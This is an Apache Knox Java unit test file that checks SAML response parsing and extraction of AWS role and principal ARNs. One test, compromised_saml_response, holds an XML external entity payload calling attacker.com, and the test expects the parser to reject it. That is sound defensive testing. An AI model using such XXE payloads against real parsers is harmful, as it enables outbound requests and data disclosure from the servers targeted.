/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 * <p/>
 * http://www.apache.org/licenses/LICENSE-2.0
 * <p/>
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.apache.knox.gateway.aws.utils;

import static org.hamcrest.MatcherAssert.assertThat;
import static org.hamcrest.Matchers.contains;
import static org.hamcrest.Matchers.hasProperty;
import static org.hamcrest.Matchers.hasSize;
import static org.hamcrest.Matchers.is;

import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.stream.Collectors;
import javax.servlet.ServletException;
import org.apache.commons.codec.binary.Base64;
import org.apache.knox.gateway.aws.model.AwsRolePrincipalSamlPair;
import org.junit.Test;
import org.opensaml.core.xml.schema.XSString;

public class SamlUtilsTest {

  @Test
  public void validResponse() throws Exception {
    String samlXml = "<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" "
        + "xmlns:aws=\"urn:oasis:names:tc:SAML:2.0:assertion\" "
        + "ID=\"_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e6\" Version=\"2.0\" "
        + "IssueInstant=\"2014-07-17T01:01:48Z\" "
        + "Destination=\"http://sp.example.com/demo1/index.php?acs\" "
        + "InResponseTo=\"ONELOGIN_4fee3b046395c4e751011e97f8900b5273d56685\">\n"
        + "  <aws:Issuer>http://idp.example.com/metadata.php</aws:Issuer>\n"
        + "  <samlp:Status>\n"
        + "    <samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/>\n"
        + "  </samlp:Status>\n"
        + "  <aws:Assertion xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
        + "  xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" "
        + "  ID=\"_d71a3a8e9fcc45c9e9d248ef7049393fc8f04e5f75\" "
        + "  Version=\"2.0\" IssueInstant=\"2014-07-17T01:01:48Z\">\n"
        + "    <aws:Issuer>http://idp.example.com/metadata.php</aws:Issuer>\n"
        + "    <aws:Subject>\n"
        + "      <aws:NameID SPNameQualifier=\"http://sp.example.com/demo1/metadata.php\" "
        + "Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:transient\">"
        + "   _ce3d2948b4cf20146dee0a0b3dd6f69b6cf86f62d7</aws:NameID>\n"
        + "      <aws:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\">\n"
        + "        <aws:SubjectConfirmationData NotOnOrAfter=\"2024-01-18T06:21:48Z\" "
        + "     Recipient=\"http://sp.example.com/demo1/index.php?acs\" "
        + "     InResponseTo=\"ONELOGIN_4fee3b046395c4e751011e97f8900b5273d56685\"/>\n"
        + "      </aws:SubjectConfirmation>\n"
        + "    </aws:Subject>\n"
        + "    <aws:Conditions NotBefore=\"2014-07-17T01:01:18Z\" "
        + "    NotOnOrAfter=\"2024-01-18T06:21:48Z\">\n"
        + "      <aws:AudienceRestriction>\n"
        + "        <aws:Audience>http://sp.example.com/demo1/metadata.php</aws:Audience>\n"
        + "      </aws:AudienceRestriction>\n"
        + "    </aws:Conditions>\n"
        + "    <aws:AuthnStatement AuthnInstant=\"2014-07-17T01:01:48Z\" "
        + "    SessionNotOnOrAfter=\"2024-07-17T09:01:48Z\" "
        + "    SessionIndex=\"_be9967abd904ddcae3c0eb4189adbe3f71e327cf93\">\n"
        + "      <aws:AuthnContext>\n"
        + "        <aws:AuthnContextClassRef>"
        + "        urn:oasis:names:tc:SAML:2.0:ac:classes:Password</aws:AuthnContextClassRef>\n"
        + "      </aws:AuthnContext>\n"
        + "    </aws:AuthnStatement>\n"
        + "    <aws:AttributeStatement>\n"
        + "      <aws:Attribute Name=\"uid\" "
        + "       NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\">\n"
        + "        <aws:AttributeValue xsi:type=\"xs:string\">testuid</aws:AttributeValue>\n"
        + "      </aws:Attribute>\n"
        + "      <aws:Attribute Name=\"mail\" "
        + "      NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\">\n"
        + "      <aws:AttributeValue xsi:type=\"xs:string\">test@example.com</aws:AttributeValue>\n"
        + "      </aws:Attribute>\n"
        + "      <aws:Attribute Name=\"eduPersonAffiliation\" "
        + "      NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\">\n"
        + "        <aws:AttributeValue xsi:type=\"xs:string\">users</aws:AttributeValue>\n"
        + "        <aws:AttributeValue xsi:type=\"xs:string\">guest</aws:AttributeValue>\n"
        + "      </aws:Attribute>\n"
        + "    </aws:AttributeStatement>\n"
        + "  </aws:Assertion>\n"
        + "</samlp:Response>";

    Set<String> attrs = new HashSet<>();
    Collections.addAll(attrs, "uid", "mail", "eduPersonAffiliation");
    Map<String, List<Object>> parsedAttributes = SamlUtils.parseAttributes(encodeXml(samlXml),
        attrs);

    assertThat(parsedAttributes.size(), is(3));
    List<String> uidValues = convertXmlListToStringList(parsedAttributes.get("uid"));
    assertThat(uidValues, hasSize(1));
    assertThat(uidValues, contains("testuid"));

    List<String> mailValues = convertXmlListToStringList(parsedAttributes.get("mail"));
    assertThat(mailValues, hasSize(1));
    assertThat(mailValues, contains("test@example.com"));

    List<String> eduPersonAffiliationValues = convertXmlListToStringList(
        parsedAttributes.get("eduPersonAffiliation"));
    assertThat(eduPersonAffiliationValues, hasSize(2));
    assertThat(eduPersonAffiliationValues, contains("users", "guest"));
  }

  @Test
  public void validSamlResponse_AwsRoles_VaryingNamespace() throws Exception {
    String samlXml = "<samlp2:Response xmlns:samlp2=\"urn:oasis:names:tc:SAML:2.0:protocol\" "
        + "xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" "
        + "ID=\"_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e6\" Version=\"2.0\" "
        + "InResponseTo=\"ONELOGIN_4fee3b046395c4e751011e97f8900b5273d56685\">\n"
        + "  <saml2:Issuer>http://idp.example.com/metadata.php</saml2:Issuer>\n"
        + "  <samlp2:Status>\n"
        + "    <samlp2:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/>\n"
        + "  </samlp2:Status>\n"
        + "  <saml2:Assertion xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
        + "  xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" "
        + "  ID=\"_d71a3a8e9fcc45c9e9d248ef7049393fc8f04e5f75\" "
        + "  Version=\"2.0\" IssueInstant=\"2014-07-17T01:01:48Z\">\n"
        + "    <saml2:AttributeStatement>\n"
        + "      <saml2:Attribute Name=\"https://aws.amazon.com/SAML/Attributes/Role\" "
        + "        NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\">\n"
        + "        <saml2:AttributeValue xsi:type=\"xs:string\">"
        + "arn:aws:iam::123456789012:role/role1,arn:aws:iam::123456789012:saml-provider/user1\n"
        + "        </saml2:AttributeValue>\n"
        + "<saml2:AttributeValue xsi:type=\"xs:string\">"
        + "arn:aws:iam::123456789012:role/role2,arn:aws:iam::123456789012:saml-provider/user2\n"
        + "        </saml2:AttributeValue>\n"
        + "      </saml2:Attribute>\n"
        + "    </saml2:AttributeStatement>\n"
        + "  </saml2:Assertion>\n"
        + "</samlp2:Response>";
    List<AwsRolePrincipalSamlPair> parsedRoles = SamlUtils
        .getSamlAwsRoleAttributeValues(encodeXml(samlXml));
    assertThat(parsedRoles, hasSize(2));
    assertThat(parsedRoles, contains(
        hasProperty("roleArn", is("arn:aws:iam::123456789012:role/role1")),
        hasProperty("roleArn", is("arn:aws:iam::123456789012:role/role2"))
    ));
    assertThat(parsedRoles, contains(
        hasProperty("principalArn", is("arn:aws:iam::123456789012:saml-provider/user1")),
        hasProperty("principalArn", is("arn:aws:iam::123456789012:saml-provider/user2"))
    ));
    assertThat(parsedRoles, contains(
        hasProperty("roleName", is("role1")),
        hasProperty("roleName", is("role2"))
    ));
    assertThat(parsedRoles, contains(
        hasProperty("principalName", is("user1")),
        hasProperty("principalName", is("user2"))
    ));
  }

  @Test(expected = IllegalArgumentException.class)
  public void validSamlResponse_Incorrect_Role_AwsRoleAttribute() throws Exception {
    String samlXml = "<samlp2:Response xmlns:samlp2=\"urn:oasis:names:tc:SAML:2.0:protocol\" "
        + "xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" "
        + "ID=\"_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e6\" Version=\"2.0\" "
        + "InResponseTo=\"ONELOGIN_4fee3b046395c4e751011e97f8900b5273d56685\">\n"
        + "  <saml2:Issuer>http://idp.example.com/metadata.php</saml2:Issuer>\n"
        + "  <samlp2:Status>\n"
        + "    <samlp2:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/>\n"
        + "  </samlp2:Status>\n"
        + "  <saml2:Assertion xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
        + "  xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" "
        + "  ID=\"_d71a3a8e9fcc45c9e9d248ef7049393fc8f04e5f75\" "
        + "  Version=\"2.0\" IssueInstant=\"2014-07-17T01:01:48Z\">\n"
        + "    <saml2:AttributeStatement>\n"
        + "      <saml2:Attribute Name=\"https://aws.amazon.com/SAML/Attributes/Role\" "
        + "        NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\">\n"
        + "        <saml2:AttributeValue xsi:type=\"xs:string\">arn:aws:iam::123456789012:role1,arn:aws:iam::123456789012:saml-provider/user1</saml2:AttributeValue>\n"
        + "      </saml2:Attribute>\n"
        + "    </saml2:AttributeStatement>\n"
        + "  </saml2:Assertion>\n"
        + "</samlp2:Response>";
    SamlUtils.getSamlAwsRoleAttributeValues(encodeXml(samlXml));
  }

  @Test(expected = IllegalArgumentException.class)
  public void validSamlResponse_Incorrect_Principal_AwsRoleAttribute() throws Exception {
    String samlXml = "<samlp2:Response xmlns:samlp2=\"urn:oasis:names:tc:SAML:2.0:protocol\" "
        + "xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" "
        + "ID=\"_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e6\" Version=\"2.0\" "
        + "InResponseTo=\"ONELOGIN_4fee3b046395c4e751011e97f8900b5273d56685\">\n"
        + "  <saml2:Issuer>http://idp.example.com/metadata.php</saml2:Issuer>\n"
        + "  <samlp2:Status>\n"
        + "    <samlp2:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/>\n"
        + "  </samlp2:Status>\n"
        + "  <saml2:Assertion xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
        + "  xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" "
        + "  ID=\"_d71a3a8e9fcc45c9e9d248ef7049393fc8f04e5f75\" "
        + "  Version=\"2.0\" IssueInstant=\"2014-07-17T01:01:48Z\">\n"
        + "    <saml2:AttributeStatement>\n"
        + "      <saml2:Attribute Name=\"https://aws.amazon.com/SAML/Attributes/Role\" "
        + "        NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\">\n"
        + "        <saml2:AttributeValue xsi:type=\"xs:string\">arn:aws:iam::123456789012:role/role1,arn:aws:iam::123456789012:user1</saml2:AttributeValue>\n"
        + "      </saml2:Attribute>\n"
        + "    </saml2:AttributeStatement>\n"
        + "  </saml2:Assertion>\n"
        + "</samlp2:Response>";
    SamlUtils.getSamlAwsRoleAttributeValues(encodeXml(samlXml));
  }

  @Test(expected = IllegalArgumentException.class)
  public void validSamlResponse_Incorrect_NumParts_AwsRoleAttribute() throws Exception {
    String samlXml = "<samlp2:Response xmlns:samlp2=\"urn:oasis:names:tc:SAML:2.0:protocol\" "
        + "xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" "
        + "ID=\"_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e6\" Version=\"2.0\" "
        + "InResponseTo=\"ONELOGIN_4fee3b046395c4e751011e97f8900b5273d56685\">\n"
        + "  <saml2:Issuer>http://idp.example.com/metadata.php</saml2:Issuer>\n"
        + "  <samlp2:Status>\n"
        + "    <samlp2:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/>\n"
        + "  </samlp2:Status>\n"
        + "  <saml2:Assertion xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
        + "  xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" "
        + "  ID=\"_d71a3a8e9fcc45c9e9d248ef7049393fc8f04e5f75\" "
        + "  Version=\"2.0\" IssueInstant=\"2014-07-17T01:01:48Z\">\n"
        + "    <saml2:AttributeStatement>\n"
        + "      <saml2:Attribute Name=\"https://aws.amazon.com/SAML/Attributes/Role\" "
        + "        NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\">\n"
        + "        <saml2:AttributeValue xsi:type=\"xs:string\">incorrectmapping</saml2:AttributeValue>\n"
        + "      </saml2:Attribute>\n"
        + "    </saml2:AttributeStatement>\n"
        + "  </saml2:Assertion>\n"
        + "</samlp2:Response>";
    SamlUtils.getSamlAwsRoleAttributeValues(encodeXml(samlXml));
  }

  @Test(expected = ServletException.class)
  public void invalidXmlResponse() throws Exception {
    SamlUtils.parseAttributes(encodeXml("invalid xml"), Collections.singleton("some-key"));
  }

  @Test(expected = ServletException.class)
  public void validXml_InvalidResponse() throws Exception {
    SamlUtils.parseAttributes(encodeXml("<samlp:Response></<samlp:Response>"),
        Collections.singleton("some-key"));
  }

  @Test(expected = ServletException.class)
  public void compromised_saml_response() throws Exception {
    String compromisedSamlXml = "     <!DOCTYPE Message [\n"
        + "    <!ENTITY send SYSTEM \"http://attacker.com/working\">\n"
        + "    ]>\n"
        + "    <Message>&send;</Message>"
        + "<samlp2:Response xmlns:samlp2=\"urn:oasis:names:tc:SAML:2.0:protocol\" "
        + "xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" "
        + "ID=\"_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e6\" Version=\"2.0\" "
        + "InResponseTo=\"ONELOGIN_4fee3b046395c4e751011e97f8900b5273d56685\">\n"
        + "  <saml2:Issuer>http://idp.example.com/metadata.php</saml2:Issuer>\n"
        + "  <samlp2:Status>\n"
        + "    <samlp2:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/>\n"
        + "  </samlp2:Status>\n"
        + "  <saml2:Assertion xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
        + "  xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" "
        + "  ID=\"_d71a3a8e9fcc45c9e9d248ef7049393fc8f04e5f75\" "
        + "  Version=\"2.0\" IssueInstant=\"2014-07-17T01:01:48Z\">\n"
        + "    <saml2:AttributeStatement>\n"
        + "      <saml2:Attribute Name=\"https://aws.amazon.com/SAML/Attributes/Role\" "
        + "        NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\">\n"
        + "        <saml2:AttributeValue xsi:type=\"xs:string\">role1;user1</saml2:AttributeValue>\n"
        + "        <saml2:AttributeValue xsi:type=\"xs:string\">incorrectrolemapping</saml2:AttributeValue>\n"
        + "      </saml2:Attribute>\n"
        + "    </saml2:AttributeStatement>\n"
        + "  </saml2:Assertion>\n"
        + "</samlp2:Response>";

    SamlUtils.parseAttributes(encodeXml(compromisedSamlXml), Collections.singleton("some-key"));
  }

  // ADFS seems to not send type for attributes which causes Type to be XSAny, and not XSString
  @Test
  public void non_conformant_response() throws Exception {
    String nonConformantXml = "<samlp:Response ID=\"_de4f6b26-83bd-4b8a-855b-4e9e715b2278\" "
        + "Version=\"2.0\" IssueInstant=\"2019-03-25T23:59:57.767Z\" "
        + "Destination=\"https://host.domain.com:8442/gateway/knoxsso/api/v1/websso?pac4jCallback=true&amp;client_name=SAML2Client\""
        + " Consent=\"urn:oasis:names:tc:SAML:2.0:consent:unspecified\" "
        + "InResponseTo=\"_rv6o1uip3ku6tno6sgbbivrsnoxt2v8rmycvitr\" "
        + "xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\">"
        + "<Issuer xmlns=\"urn:oasis:names:tc:SAML:2.0:assertion\">http://adfs.rbhartia.com/adfs/services/trust</Issuer>"
        + "<samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\" />"
        + "</samlp:Status><Assertion ID=\"_75af8551-c0f4-4996-82ef-cba2747eb81b\" "
        + "IssueInstant=\"2019-03-25T23:59:57.767Z\" Version=\"2.0\" "
        + "xmlns=\"urn:oasis:names:tc:SAML:2.0:assertion\">"
        + "<Issuer>http://adfs.rbhartia.com/adfs/services/trust</Issuer>"
        + "<ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">"
        + "<ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" />"
        + "<ds:SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\" />"
        + "<ds:Reference URI=\"#_75af8551-c0f4-4996-82ef-cba2747eb81b\"><ds:Transforms>"
        + "<ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\" />"
        + "<ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" /></ds:Transforms>"
        + "<ds:DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\" />"
        + "<ds:DigestValue>3BPaJWs65rYU6BNojwm47TclxeymxGZ3DySianz2vso=</ds:DigestValue></ds:Reference>"
        + "</ds:SignedInfo><ds:SignatureValue>ekidzs/TVu5gq691f3FXZusFzwasRiwVoR/OOz7AsSFb++"
        + "</ds:SignatureValue><KeyInfo xmlns=\"http://www.w3.org/2000/09/xmldsig#\">"
        + "<ds:X509Data><ds:X509Certificate>/+++Fw0G0bzB0tqF/+/+ccHRjc7"
        + "</ds:X509Certificate></ds:X509Data></KeyInfo></ds:Signature><Subject>"
        + "<NameID Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:persistent\">someuser\\Administrator</NameID>"
        + "<SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\">"
        + "<SubjectConfirmationData InResponseTo=\"_rv6o1uip3ku6tno6sgbbivrsnoxt2v8rmycvitr\" "
        + "NotOnOrAfter=\"2019-03-26T00:04:57.767Z\" "
        + "Recipient=\"https://host.domain.com:8442/gateway/knoxsso/api/v1/websso?pac4jCallback=true&amp;client_name=SAML2Client\" />"
        + "</SubjectConfirmation></Subject><Conditions NotBefore=\"2019-03-25T23:59:57.767Z\" "
        + "NotOnOrAfter=\"2019-03-26T00:59:57.767Z\">"
        + "<AudienceRestriction><Audience>https://signin.aws.amazon.com/saml</Audience>"
        + "</AudienceRestriction></Conditions><AttributeStatement>"
        + "<Attribute Name=\"https://aws.amazon.com/SAML/Attributes/Role\">"
        + "<AttributeValue>arn:aws:iam::176430881729:role/s3-read-access-user-adfs,arn:aws:iam::176430881729:saml-provider/user-adfs"
        + "</AttributeValue></Attribute></AttributeStatement><AuthnStatement AuthnInstant=\"2019-03-25T22:05:59.137Z\" "
        + "SessionIndex=\"_75af8551-c0f4-4996-82ef-cba2747eb81b\">"
        + "<AuthnContext><AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"
        + "</AuthnContextClassRef></AuthnContext>"
        + "</AuthnStatement></Assertion></samlp:Response>";
    List<AwsRolePrincipalSamlPair> parsedRoles = SamlUtils
        .getSamlAwsRoleAttributeValues(encodeXml(nonConformantXml));
    assertThat(parsedRoles, hasSize(1));
    assertThat(parsedRoles, contains(
        hasProperty("roleArn", is("arn:aws:iam::176430881729:role/s3-read-access-user-adfs"))
    ));
    assertThat(parsedRoles, contains(
        hasProperty("principalArn", is("arn:aws:iam::176430881729:saml-provider/user-adfs"))
    ));
  }

  private String encodeXml(String xml) throws Exception {
    byte[] samlAssertionEncoded = Base64.encodeBase64(xml.getBytes("UTF-8"));
    return new String(samlAssertionEncoded, "UTF-8");
  }

  private List<String> convertXmlListToStringList(List<Object> xmlObjects) {
    return xmlObjects.stream()
        .map(object -> ((XSString) object).getValue())
        .collect(Collectors.toList());
  }
}
